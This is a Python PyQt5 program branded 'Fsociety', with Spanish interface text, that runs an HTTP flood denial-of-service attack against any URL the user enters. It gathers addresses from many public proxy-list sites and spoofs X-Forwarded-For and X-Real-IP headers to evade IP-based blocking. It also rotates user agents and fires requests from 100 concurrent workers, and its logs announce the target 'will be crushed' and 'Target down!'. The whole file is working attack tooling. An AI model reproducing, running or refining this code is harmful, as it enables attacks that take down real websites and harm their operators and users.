import sys
import asyncio
import aiohttp
import random
import re
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO
import requests
import string
import time


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]


proxy_sources = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 100  
        self.request_limit = 50000000000  

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"Failed to fetch IPs from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
            "Cache-Control": "no-cache",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Real-IP": ip_address,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"])
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"fsociety@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  

    async def attack_worker(self, session, ip_cycle, requests_per_worker):
        for _ in range(requests_per_worker):
            await self.send_request(session, next(ip_cycle))
            await asyncio.sleep(1 / self.request_limit)  

    async def attack(self):
        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log_signal.emit("No IP list found. Generating random IPs...")
            ip_list = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
        ip_cycle = itertools.cycle(ip_list)
        requests_per_worker = self.num_requests // self.max_concurrent

        async def worker():
            async with aiohttp.ClientSession() as session:
                await self.attack_worker(session, ip_cycle, requests_per_worker)

        start_time = time.time()
        tasks = [worker() for _ in range(self.max_concurrent)]
        await asyncio.gather(*tasks, return_exceptions=True)
        elapsed_time = time.time() - start_time
        self.log_signal.emit(f"Attack finished in {elapsed_time:.2f} seconds. Target down!")

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety")
        self.setGeometry(200, 200, 600, 600)
        self.setStyleSheet("QMainWindow { background-color: #000000; color: white; border-radius: 5px; }")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: #ffffff; color: #FF0000; border: 5px solid #FF0000; border-radius: 10px;")
        layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #000000;")
        layout.addWidget(self.image_label)

        image_url = "https://static.ts.360.com/blog/wp-content/uploads/2016/08/160822-Post-fsociety-1.png"
        self.load_image(image_url)

        slogan_label = QLabel("WE ARE FINALLY FREE. WE ARE FINALLY AWARE.")
        slogan_label.setAlignment(Qt.AlignCenter)
        slogan_label.setStyleSheet("color: #ff0000; font-size: 14px; font-weight: bold;")
        layout.addWidget(slogan_label)

        title_label = QLabel("FSOCIETY")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: white; font-size: 24px; font-weight: bold;")
        layout.addWidget(title_label)

        self.url_label = QLabel("URL de destino:")
        self.url_label.setAlignment(Qt.AlignCenter)
        self.url_label.setStyleSheet("color: #ff0000;")
        layout.addWidget(self.url_label)

        self.url_input = QLineEdit()
        self.url_input.setFixedWidth(300)
        self.url_input.setStyleSheet("background-color: #1e5ed6; color: white; border: 1px solid #ff0000; border-radius: 5px;")
        layout.addWidget(self.url_input, alignment=Qt.AlignCenter)

        self.requests_label = QLabel("Número de solicitudes :")
        self.requests_label.setAlignment(Qt.AlignCenter)
        self.requests_label.setStyleSheet("color: #ff0000;")
        layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setFixedWidth(300)
        self.requests_input.setStyleSheet("background-color: #1e5ed6; color: white; border: 1px solid #ff0000; border-radius: 5px;")
        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)

        self.start_button = QPushButton("Start")
        self.start_button.setFixedWidth(100)
        self.start_button.setStyleSheet("background-color: #ff0000; color: white; border-radius: 5px;")
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button, alignment=Qt.AlignCenter)

        central_widget.setLayout(layout)

    def log_message(self, message):
        self.log_output.append(message)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(600, 600, Qt.KeepAspectRatio))
        except Exception as e:
            self.log_message(f"Image load error: {e}")

    def start_attack(self):
        target_url = self.url_input.text()
        try:
            num_requests = int(self.requests_input.text())
        except ValueError:
            QMessageBox.critical(self, "Fsociety", "¡El número de solicitudes debe ser un número entero!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Fsociety", "¡Ingrese una URL válida y número de solicitudes!")
            return

        self.log_message("Ataque DDoS iniciado. ¡El objetivo será aplastado!")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "Fsociety", "¡El ataque ha comenzado! ¡Revisen los registros!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
